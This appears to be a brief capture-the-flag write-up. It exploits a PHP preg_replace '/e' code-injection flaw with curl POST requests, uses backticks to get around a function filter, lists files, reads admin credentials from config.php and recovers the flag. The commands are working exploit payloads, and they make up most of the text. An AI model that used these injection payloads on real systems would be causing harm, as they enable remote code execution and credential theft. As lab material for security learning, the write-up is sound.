This is preg_replace remote code execution in http://alienzon.com/?type=fun <br />
Checking: `curl -X POST -d "who=//e&yourname=phpinfo();" "http://alienzon.com/?type=fun"` => Success <br />
They filter: system(), exec(), popen(). <br />
So i try: curl -X POST -d "who=//e&yourname=\`ls\`" "http://alienzon.com/?type=fun" => `<br> config.php<br>css<br>favicon.ico<br>img<br>index.php<br>js<br>robots.txt<br>webpotato.php<br>`. Great <br />
curl -X POST -d "who=//e&yourname=\`cat config.php\`" "http://alienzon.com/?type=fun" => `$admin_username = 'admin';$admin_password = 'deepspace';` <br />
Login and get flag: CODE{R3gular_Expr3ssions_Now_You_Have_2_Probl3ms}


